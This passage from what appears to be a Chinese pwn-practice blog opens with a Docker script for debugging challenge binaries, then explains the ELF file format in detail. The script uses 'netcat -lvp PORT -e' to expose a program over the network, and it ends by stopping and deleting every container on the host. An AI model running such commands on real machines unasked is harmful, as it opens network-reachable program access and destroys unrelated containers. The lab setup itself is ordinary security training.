class="variable">$&#123;IMAGE_NAME&#125;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get continer id</span></span><br><span class="line">CONTAINER_ID=$(docker ps -q --filter <span class="string">&quot;ancestor=<span class="variable">$&#123;IMAGE_NAME&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># cp files</span></span><br><span class="line">docker <span class="built_in">cp</span> ./tools/gdbserver <span class="variable">$&#123;CONTAINER_ID&#125;</span>:<span class="variable">$&#123;CONTAINER_HOME&#125;</span></span><br><span class="line">docker <span class="built_in">cp</span> ./tools/netcat <span class="variable">$&#123;CONTAINER_ID&#125;</span>:<span class="variable">$&#123;CONTAINER_HOME&#125;</span></span><br><span class="line">docker <span class="built_in">cp</span> ./<span class="variable">$&#123;PROG_NAME&#125;</span> <span class="variable">$&#123;CONTAINER_ID&#125;</span>:<span class="variable">$&#123;CONTAINER_HOME&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># start run</span></span><br><span class="line">docker <span class="built_in">exec</span> -itd -w <span class="variable">$&#123;CONTAINER_HOME&#125;</span> <span class="variable">$&#123;CONTAINER_ID&#125;</span> /bin/bash -c <span class="string">&quot;./netcat -lvp <span class="variable">$&#123;NC_PORT&#125;</span> -e ./<span class="variable">$&#123;PROG_NAME&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">read</span></span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> -it -w <span class="variable">$&#123;CONTAINER_HOME&#125;</span> <span class="variable">$&#123;CONTAINER_ID&#125;</span> /bin/bash -c <span class="string">&quot;ps -ef | grep <span class="variable">$&#123;PROG_NAME&#125;</span> | grep -v &#x27;grep&#x27; | grep -v &#x27;\-c&#x27; | awk &#x27;&#123;print \$2&#125;&#x27; | xargs ./gdbserver :<span class="variable">$&#123;DBG_PORT&#125;</span> --attach&quot;</span></span><br><span class="line"><span class="built_in">read</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#docker stop $&#123;CONTAINER_ID&#125;</span></span><br><span class="line"><span class="comment">#docker rm $&#123;CONTAINER_ID&#125;</span></span><br><span class="line"></span><br><span class="line">docker stop $(docker ps -a -q)</span><br><span class="line">docker <span class="built_in">rm</span> $(docker ps -a -q)</span><br></pre></td></tr></table></figure></div> # ELF
文件格式 ELF（Executable and Linkable
Format）是一种常见的可执行文件和可链接文件格式，主要用于Linux和类Unix系统。ELF
文件可以包含不同的类型，常见的 ELF 文件类型包括： -
可执行文件（<code>ET_EXEC</code>）：这种类型的 ELF
文件是可直接执行的程序，可以在操作系统上运行。 -
共享目标文件（<code>ET_DYN</code>）：这种类型的 ELF
文件是可被动态链接的共享库，可以在运行时与其他程序动态链接。该类型文件后缀名为
<code>.so</code> 。 - 可重定位文件（<code>ET_REL</code>）：这种类型的
ELF
文件是编译器生成的目标文件，通常用于将多个目标文件链接到一个可执行文件或共享库中。该类型文件后缀名为
<code>.o</code> ，静态链接库（<code>.a</code>）也可以归为这一类。 -
核心转储文件（<code>ET_CORE</code>）：这种类型的 ELF
文件是操作系统在程序崩溃或发生错误时生成的核心转储文件，用于调试和分析程序崩溃的原因。</p>
<p>ELF 文件结构及相关常数被定义在 <code>/usr/include/elf.h</code>
里，因为 ELF 文件在各种平台下都通用，ELF文件有 32 位版本和 64 位版本。32
位版本与 64 位版本的 ELF
文件的格式基本是一样的（部分结构体为了优化对齐后大小调整了成员的顺序），只不过有些成员的大小不一样。</p>
<p><code>elf.h</code> 使用 typedef 定义了一套自己的变量体系： |
自定义类型 | 描述 | 原始类型 | 长度（字节） | | ------------- |
----------------------- | ---------- | ------------ | |
<code>Elf32_Addr</code> | 32 位版本程序地址 | <code>uint32_t</code> | 4
| | <code>Elf32_Half</code> | 32 位版本的无符号短整型 |
<code>uint16_t</code> | 2 | | <code>Elf32_Off</code> | 32
位版本的偏移地址 | <code>uint32_t</code> | 4 | |
<code>Elf32_Sword</code> | 32 位版本有符号整型 | <code>uint32_t</code> |
4 | | <code>Elf32_Word</code> | 32 位版本无符号整型 |
<code>int32_t</code> | 4 | | <code>Elf64_Addr</code> | 64 位版本程序地址
| <code>uint64_t</code> | 8 | | <code>Elf64_Half</code> | 64
位版本的无符号短整型 | <code>uint16_t</code> | 2 | |
<code>Elf64_Off</code> | 64 位版本的偏移地址 | <code>uint64_t</code> | 8
| | <code>Elf64_Sword</code> | 64 位版本有符号整型 |
<code>uint32_t</code> | 4 | | <code>Elf64_Word</code> | 64
位版本无符号整型 | <code>int32_t</code> | 4 |</p>
<p>ELF
主要管理结构为文件头，程序头表（可重定位文件没有）和节表，其他部分有一个个节组成，多个属性相同的节构成一个段。对于节的介绍这里按照静态链接相关和动态链接相关分别介绍。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241108001735862.png"
                      alt="image-20241108001735862" style="zoom:33%;" 
                ></p>
<h2 id="文件头">文件头</h2>
<p>我们这里以 32 位版本的文件头结构 <code>Elf32_Ehdr</code>
作为例子来描述，它的定义如下： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The ELF file header.  This appears at the start of every ELF file.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EI_NIDENT (16)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	e_ident[EI_NIDENT];	<span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf32_Half	e_type;			<span class="comment">/* Object file type */</span></span><br><span class="line">  Elf32_Half	e_machine;		<span class="comment">/* Architecture */</span></span><br><span class="line">  Elf32_Word	e_version;		<span class="comment">/* Object file version */</span></span><br><span class="line">  Elf32_Addr	e_entry;		<span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf32_Off	e_phoff;		<span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf32_Off	e_shoff;		<span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf32_Word	e_flags;		<span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf32_Half	e_ehsize;		<span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf32_Half	e_phentsize;		<span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf32_Half	e_phnum;		<span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf32_Half	e_shentsize;		<span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf32_Half	e_shnum;		<span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf32_Half	e_shstrndx;		<span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure></div> -
<strong><code>e_ident</code>：ELF 文件的魔数和其他信息。</strong> - 前 4
字节为 <code>ELFMAG</code> 即 <code>\x7fELF</code> 。 - 第 5 字节为 ELF
文件类型，值为 <code>ELFCLASS32(1)</code> 代表 32 位，值为
<code>ELFCLASS64(2)</code> 代表 64 位。 - 第 6 字节为 ELF 的字节序，0
为无效格式，1 为小端格式，2 为大端格式。 - 第 7 字节为 ELF 版本，一般为
1 ，即 1.2 版本。 - 后面 9 字节没有定义一般填 0 ，有些平台会使用这 9
个字节作为扩展标志。 -
<strong><code>e_type</code>：表示ELF文件类型，如可执行文件、共享对象文件（<code>.so</code>）、可重定位文件（<code>.o</code>）等。</strong>
- <code>e_machine</code>：表示目标体系结构，即程序的目标平台，如
x86、ARM 等。相关常量以 <code>EM_</code> 开头。 -
<code>e_version</code>：ELF 文件版本号，一般为常数 1 。 -
<strong><code>e_entry</code>：表示程序入口点虚拟地址。操作系统加载完程序后从这个地址开始执行进程的命令。可重定位文件一般没有入口地址，则这个值为
0 。</strong> -
<strong><code>e_phoff</code>：表示程序头表的文件偏移量。</strong> -
<strong><code>e_shoff</code>：表示节表的文件偏移量。</strong> -
<code>e_flags</code>：表示处理器特定标志。 -
<strong><code>e_ehsize</code>：表示 ELF 文件头的大小。</strong> -
<strong><code>e_phentsize</code>：表示程序头表中每个表项的大小。</strong>
- <strong><code>e_phnum</code>：表示程序头表中表项的数量。</strong> -
<strong><code>e_shentsize</code>：表示节表中每个表项的大小。</strong> -
<strong><code>e_shnum</code>：表示节表中表项的数量。</strong> -
<code>e_shstrndx</code>：<strong>表示节表中字符串表的索引。</strong> ##
程序头表 ELF 可执行文件中有一个专门的数据结构叫做程序头表（Program
Header
Table）用来保存<strong>段</strong>（<strong>注意不是节</strong>）的信息。因为
ELF <strong>目标文件</strong>不需要被装载，所以它没有程序头表，而 ELF
的<strong>可执行文件</strong>和<strong>共享库文件</strong>都有程序头表。</p>
<p>程序头表是由 <code>Elf*_Phdr</code> 组成的数组，用于描述 ELF
文件中每个节的属性和信息。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Program segment header.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	p_type;			<span class="comment">/* Segment type */</span></span><br><span class="line">  Elf32_Off	p_offset;		<span class="comment">/* Segment file offset */</span></span><br><span class="line">  Elf32_Addr	p_vaddr;		<span class="comment">/* Segment virtual address */</span></span><br><span class="line">  Elf32_Addr	p_paddr;		<span class="comment">/* Segment physical address */</span></span><br><span class="line">  Elf32_Word	p_filesz;		<span class="comment">/* Segment size in file */</span></span><br><span class="line">  Elf32_Word	p_memsz;		<span class="comment">/* Segment size in memory */</span></span><br><span class="line">  Elf32_Word	p_flags;		<span class="comment">/* Segment flags */</span></span><br><span class="line">  Elf32_Word	p_align;		<span class="comment">/* Segment alignment */</span></span><br><span class="line">&#125; Elf32_Phdr;</span><br></pre></td></tr></table></figure></div> -
<code>p_type</code>：段的类型，例如可执行段、数据段等。 -
<code>p_offset</code>：段在文件中的偏移量。 -
<code>p_vaddr</code>：段在虚拟内存中的起始地址。 -
<code>p_paddr</code>：段在物理内存中的起始地址。因为 ELF
还没装载不知道物理地址，所以作为保留字段。通常和 <code>p_vaddr</code>
的值是一样的。 - <code>p_filesz</code>：段在文件中的大小。 -
<code>p_memsz</code>：段在内存中的大小。 -
<code>p_flags</code>：段的标志，例如可读、可写、可执行等。 -
<code>p_align</code>：段在文件和内存中的对齐方式。段的的加载地址要能被
<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mtext>p_align</mtext></msup></mrow><annotation encoding="application/x-tex">2^{\text{p\_align}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">p_align</span></span></span></span></span></span></span></span></span></span></span></span></span> 整除。 ## 节表 ELF文件里面定义一个固定长度的
<code>Elf*_Shdr</code> 结构体数组用来存放<strong>节</strong>相关信息，与
PE 文件的节表相似。</p>
<blockquote>
<p>在 ELF
文件中，<strong>段</strong>（Segment）和<strong>节</strong>（Section）是两个不同的概念，它们在文件结构中具有不同的作用和目的。<br />
段（Segment）是一种逻辑上的组织单位，它定义了可执行文件或共享库在内存中的一个连续区域。每个段都有自己的虚拟地址空间，可以包含多个节。常见的段类型包括代码段（<code>.text</code>），数据段（<code>.data</code>、<code>.bss</code>），只读数据段（<code>.rodata</code>）等。段在加载和执行时被操作系统用来管理内存，设置内存保护属性以及指定虚拟地址空间的起始地址和大小。<br />
节（Section）是一种更细粒度的组织单位，它包含了文件中的特定类型的数据或代码。每个节都有自己的名字、类型和内容。常见的节类型包括代码节（<code>.text</code>），数据节（<code>.data</code>、<code>.bss</code>），只读数据节（<code>.rodata</code>），符号表节（<code>.symtab</code>），字符串表节（<code>.strtab</code>）等。节不直接参与内存的加载和执行，而是用于链接器（Linker）和调试器（Debugger）等工具对文件进行处理和分析。<br />
<strong>通俗的讲，在装载程序的时候为了节省内存会将 ELF
文件中属性相同的节（Section）合并成在一个段（Segment）加载到内存中。</strong><br />
段和节之间存在对应关系和映射关系： -
一个段可以包含多个节，这些节的内容和属性都属于该段。 -
段提供了对应于虚拟内存的逻辑映射，而节则提供了对应于文件的逻辑映射。 -
段的加载和执行涉及内存管理和地址映射，而节则用于链接和调试过程中的符号解析、重定位等操作。</p>
</blockquote>
<p>其中 <code>Elf32_Shdr</code> 定义如下： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Section header.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	sh_name;		<span class="comment">/* Section name (string tbl index) */</span></span><br><span class="line">  Elf32_Word	sh_type;		<span class="comment">/* Section type */</span></span><br><span class="line">  Elf32_Word	sh_flags;		<span class="comment">/* Section flags */</span></span><br><span class="line">  Elf32_Addr	sh_addr;		<span class="comment">/* Section virtual addr at execution */</span></span><br><span class="line">  Elf32_Off	sh_offset;		<span class="comment">/* Section file offset */</span></span><br><span class="line">  Elf32_Word	sh_size;		<span class="comment">/* Section size in bytes */</span></span><br><span class="line">  Elf32_Word	sh_link;		<span class="comment">/* Link to another section */</span></span><br><span class="line">  Elf32_Word	sh_info;		<span class="comment">/* Additional section information */</span></span><br><span class="line">  Elf32_Word	sh_addralign;		<span class="comment">/* Section alignment */</span></span><br><span class="line">  Elf32_Word	sh_entsize;		<span class="comment">/* Entry size if section holds table */</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure></div> -
<strong><code>sh_name</code>：表示节的名称在字符串表中的索引。字符串表节存储了所有节的名称，<code>sh_name</code>
指定了节的名称在字符串表中的位置。</strong> -
<strong><code>sh_type</code>：表示节的类型，指定了节的用途和属性。常见的类型包括代码段（<code>SHT_PROGBITS(1)</code>）、数据段（<code>SHT_PROGBITS(1)</code>）、符号表（<code>SHT_SYMTAB(2)</code>）、字符串表（<code>SHT_STRTAB(3)</code>）等。</strong>
-
<code>sh_flags</code>：表示节的标志，用于描述节的特性和属性。标志的具体含义取决于节的类型和上下文。
-
<strong><code>sh_addr</code>：表示节的虚拟地址，只在可执行文件中有意义。对于可执行文件，<code>sh_addr</code>
指定了节在内存中的加载地址，如果该节不可被加载，则该值为 0 。</strong> -
<strong><code>sh_offset</code>：表示节在文件中的偏移量，指定了节在文件中的位置。对于
bss 段来说该值没有意义。</strong> -
<strong><code>sh_size</code>：表示节的大小，指定了节所占据的字节数。</strong>
-
<code>sh_link</code>：表示链接到的其他节的索引，用于建立节之间的关联关系，具体含义依赖于节的类型。
- <code>sh_info</code>：附加信息，具体含义依赖于节的类型。 -
<code>sh_addralign</code>：表示节的地址对齐要求，指定了节在内存中的对齐方式。即
<code>sh_addr</code> 需要满足 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>sh_addr</mtext><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><msup><mn>2</mn><mtext>sh_addralign</mtext></msup><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\text{sh\_addr} \mod 2^{\text{sh\_addralign}} = 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">sh_addr</span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">sh_addralign</span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 。如果
<code>sh_addralign</code> 为 0 或 1 表示该段没有对齐要求。 -
<strong><code>sh_entsize</code>：表示节中每个项的大小，如果该字段为 0
说明节中不包含固定大小的项。</strong></p>
<p>ELF 中常见的节如下： - <code>.text</code>：代码段（Code
Section），用于存储程序的可执行指令。 -
<code>.rodata</code>：只读数据段（Read-Only Data
Section），用于存储只读的常量数据，例如字符串常量。 -
<code>.data</code>：数据段（Data
Section），用于存储已初始化的全局变量和静态变量。 -
<code>.bss</code>：未初始化的数据段（Block Started by
Symbol），用于存储未初始化的全局变量和静态变量。它不占用实际的文件空间，而是在运行时由系统自动初始化为零。
- <code>.symtab</code>：符号表节（Symbol Table
Section），用于存储程序的符号表信息，包括函数、变量和其他符号的名称、类型和地址等。
- <code>.strtab</code>：字符串表节（String Table
Section），用于存储字符串数据，如节名称、符号名称等。字符串表节被多个其他节引用，通过偏移量和索引来访问具体的字符串。
- <code>.rel.text</code> 或
<code>.rela.text</code>：代码重定位节（Relocation
Section），用于存储代码段中的重定位信息，以便在链接时修正代码中的符号引用。
- <code>.rel.data</code> 或
<code>.rela.data</code>：数据重定位节（Relocation
Section），用于存储数据段中的重定位信息，以便在链接时修正数据段中的符号引用。
- <code>.dynamic</code>：动态节（Dynamic
Section），用于存储程序的动态链接信息，包括动态链接器需要的重定位表、共享对象的名称、版本信息等。
- <code>.note</code>：注释节（Note
Section），用于存储与程序或库相关的注释或调试信息。 ## 静态链接相关
<strong>注意：静态链接相关只在可重定位文件中存在。比如可执行文件，如果不开启
PIE 加载地址固定，不需要对自身进行重定位，而开启 PIE
后为地址无关代码，也不需要对自身进行重定位。因此不需要静态链接也就丢弃了静态链接相关的节。</strong>
### 符号表（.symtab）
<strong>注意：符号表除了静态链接外没有用，但是程序为了方便调试会保留符号表，我们可以通过
<code>strip + 程序名</code> 的方式将符号表去除，这就是为什么有的 pwn
题的附件没有函数和变量名而有的却有。</strong></p>
<p>ELF 文件中的符号表往往是文件中的一个段，段名一般叫
<code>.symtab</code> 。符号表是一个 <code>Elf*_Sym</code> 结构（32 位
ELF 文件）的数组，每个 <code>Elf*_Sym</code> 结构对应一个符号。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Symbol table entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure></div> -
<code>st_name</code>：符号名称在<strong>字符串</strong>表中的偏移量。 -
<code>st_value</code>：符号的值，即符号的地址或偏移量。 -
如果该符号在<strong>目标文件</strong>中，如果是符号的定义并且该符号不是
<code>COMMON</code> 块类型的则 <code>st_value</code>
表示该符号在段中的<strong>偏移</strong>。 -
在<strong>目标文件</strong>中，如果符号是 <code>COMMON</code> 块类型的则
<code>st_value</code> 表示该符号的<strong>对齐属性</strong>。 -
在<strong>可执行文件</strong>中，<code>st_value</code>
表示符号的<strong>虚拟地址</strong>。 -
<code>st_size</code>：符号的大小，如果符号是一个函数，则表示函数的大小。如果该值为
0 表示符号的大小为 0 或未知。 -
<code>st_info</code>：该字段是一个字节，包含符号的类型和绑定信息。符号类型包括函数、数据、对象等，符号绑定包括局部符号、全局符号、弱符号等。该字段的高
4 位表示符号的类型，低 4 位表示符号的绑定信息。 -
<code>st_other</code>：保留字段，通常为 0 。 -
<code>st_shndx</code>：通常为符号所在<strong>节</strong>的索引。 -
如果符号是一个常量，该字段为 <code>SHN_ABS</code>（初始值不为 0
的全局变量） 或 <code>SHN_COMMON</code>（初始值为 0 的全局变量）。 -
如果该符号未定义但是在该文件中被引用到，说明该符号可能定义在其他目标文件中，则该字段为
<code>SHN_UNDEF</code> 。 ### 重定位表（.rel.text/.rel.data）
重定位表是一个 <code>Elf*_Rel</code>
结构的数组，每个数组元素对应一个重定位入口。重定位表主要有<code>.rel.text</code>
或 <code>.rela.text</code>，即代码重定位节（Relocation Section）和
<code>.rel.data</code> 或
<code>.rela.data</code>：数据重定位节（Relocation Section）。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Relocation table entry without addend (in section of type SHT_REL).  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>r_offset</code>：需要进行重定位的位置的偏移量或地址。这个位置通常是指令中的某个操作数或数据的地址，需要在链接时进行修正，以便正确地引用目标符号。
<ul>
<li>对于可执行文件或共享库，<code>r_offset</code>
表示需要修改的位置在内存中的位置（用于动态链接）。</li>
<li>对于<strong>可重定位文件</strong>，<code>r_offset</code>
表示需要修改的位置相对于段起始位置的偏移（用于静态链接）。</li>
</ul></li>
<li><code>r_info</code>：低 8
位表示符号的重定位类型，重定位类型指定了进行何种类型的修正，例如绝对重定位、PC
相对重定位等。高 24
位表示该符号在<strong>符号表</strong>中的索引，用于解析重定位所引用的符号。
### 字符串表（.strtab） ELF
文件中用到了很多字符串，比如段名、变量名等。因为字符串的长度往往是不定的，所以用固定的结构来表示它比较困难。一种很常见的做法是把字符串集中起来存放到一个表，然后使用字符串在表中的偏移来引用字符串。</li>
</ul>
<p>通过这种方法，在ELF文件中引用字符串只须给出一个数字下标即可，不用考虑字符串长度的问题。一般字符串表在ELF文件中也以段的形式保存，常见的段名为“<code>.strtab</code>”或“<code>.shstrtab</code>”。这两个字符串表分别为字符串表（String
Table）和段表字符串表（Section Header String
Table）。顾名思义，字符串表用来保存普通的字符串，比如符号的名字；段表字符串表用来保存段表中用到的字符串，最常见的就是段名（<code>sh_name</code>
）。</p>
<p>注意，在字符串表中的每个字符串的<strong>开头</strong>和<strong>结尾</strong>都有一个
<code>\x00</code> 填充。 ## 动态链接相关 ### .interp 段 在动态链接的 ELF
可执行文件中，有一个专门的段叫做 <code>.interp</code>
段（“interp”是“interpreter”（解释器）的缩写）。</p>
<p><code>.interp</code> 的内容很简单，里面保存的就是一个字符串
<code>/lib64/ld-linux-x86-64.so.2</code>
，这个字符串就是可执行文件所需要的动态链接器的路径。</p>
<p>通常系统通过判断一个 ELF 程序是否有 <code>.interp</code> 来判断该 ELF
文件是否为动态链接程序。 ### .dynamic 段 动态链接 ELF 中最重要的结构是
<code>.dynamic</code>
段，这个段里面保存了动态链接器所需要的基本信息，比如依赖于哪些共享对象、动态链接符号表的位置、动态链接重定位表的位置、共享对象初始化代码的地址等。<code>.dynamic</code>
段是由<code>Elf*_Dyn</code> 构成的结构体数组。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Dynamic section entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf32_Word d_val;			<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure></div>
<code>Elf32_Dyn</code>
结构由一个类型值加上一个附加的数值或指针，对于不同的类型，后面附加的数值或者指针有着不同的含义。我们这里列举几个比较常见的类型值（这些值都是定义在
<code>elf.h</code> 里面的宏）， -
<code>DT_SYMTAB</code>：指定了符号表的地址，<code>d_ptr</code> 表示
<code>.dynsym</code> 的地址。 -
<code>DT_STRTAB</code>：指定了字符串表的地址，<code>d_ptr</code> 表示
<code>.synstr</code> 的地址。 -
<code>DT_STRSZ</code>：指定了字符串表的大小，<code>d_val</code>
表示大小。 -
<code>DT_HASH</code>：指定了符号哈希表的地址，用于加快符号查找的速度，<code>d_ptr</code>
表示 <code>.hash</code> 的地址。 -
<code>DT_SONAME</code>：指定了共享库的名称。 -
<code>DT_RPATH</code>：指定了库搜索路径（已废弃，不推荐使用）。 -
<code>DT_INIT</code>：指定了初始化函数的地址，动态链接器在加载可执行文件或共享库时会调用该函数。
-
<code>DT_FINI</code>：指定了终止函数的地址，动态链接器在程序结束时会调用该函数。
- <code>DT_NEEDED</code>：指定了需要的共享库的名称。 -
<code>DT_REL/DT_RELA</code>：指定了重定位表的地址。 ###
动态符号表（.dynsym）
为了完成动态链接，最关键的还是所依赖的符号和相关文件的信息。我们知道在静态链接中，有一个专门的段叫做符号表
<code>.symtab</code>（Symbol
Table），里面保存了所有关于该目标文件的符号的定义和引用。为了表示动态链接这些模块之间的符号导入导出关系，ELF
专门有一个叫做动态符号表（Dynamic Symbol
Table）的段用来保存这些信息，这个段的段名通常叫做
<code>.dynsym</code>（Dynamic Symbol），同样也是由 <code>Elf*_Sym</code>
构成的结构体数组。</p>
<p>与 <code>.symtab</code> 不同的是，<code>.dynsym</code>
只保存了与动态链接相关的符号，对于那些模块内部的符号，比如模块私有变量则不保存。很多时候动态链接的模块同时拥有
<code>.dynsym</code> 和 <code>.symtab</code>
两个表，<code>.symtab</code> 中往往保存了所有符号，包括
<code>.dynsym</code> 中的符号。</p>
<p>与 <code>.symtab</code>
类似，动态符号表也需要一些辅助的表，比如用于保存符号名的字符串表。静态链接时叫做符号字符串表
<code>.strtab</code>（String Table），在这里就是动态符号字符串表
<code>.dynstr</code>（Dynamic String
Table）；由于动态链接下，我们需要在程序运行时查找符号，为了加快符号的查找过程，往往还有辅助的符号哈希表（<code>.hash</code>）。</p>
<h3
id="动态链接重定位表.rel.dyn.rel.data">动态链接重定位表（.rel.dyn/.rel.data）</h3>
<p>共享对象需要重定位的主要原因是导入符号的存在。动态链接下，无论是可执行文件或共享对象，一旦它依赖于其他共享对象，也就是说有导入的符号时，那么它的代码或数据中就会有对于导入符号的引用。在编译时这些导入符号的地址未知，在静态链接中，这些未知的地址引用在最终链接时被修正。但是在动态链接中，导入符号的地址在运行时才确定，所以需要在运行时将这些导入符号的引用修正，即需要重定位。</p>
<p>共享对象的重定位与我们在前面“静态链接”中分析过的目标文件的重定位十分类似，唯一有区别的是目标文件的重定位是在静态链接时完成的，而共享对象的重定位是在装载时完成的。在静态链接中，目标文件里面包含有专门用于表示重定位信息的重定位表，比如
<code>.rel.text</code> 表示是代码段的重定位表，<code>.rel.data</code>
是数据段的重定位表。</p>
<p>动态链接的文件中，也有类似的重定位表分别叫做 <code>.rel.dyn</code> 和
<code>.rel.plt</code> ，它们分别相当于 <code>.rel.data</code> 和
<code>.rel.text</code> 。<code>.rel.dyn</code>
实际上是对数据引用的修正，它所修正的位置位于 <code>.got</code>
以及数据段；而 <code>.rel.plt</code>
是对函数引用的修正，它所修正的位置位于 <code>.got.plt</code> 。 ### PLT
表（.plt） 在未开启 FULL RELRO 的情况下 PLT 表的结构如下图所示， PLT
表在 <code>.plt</code>（有的还包括 <code>.plt.got</code>） 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241108002353202.png"
                     
alt="image-20241108002353202" 
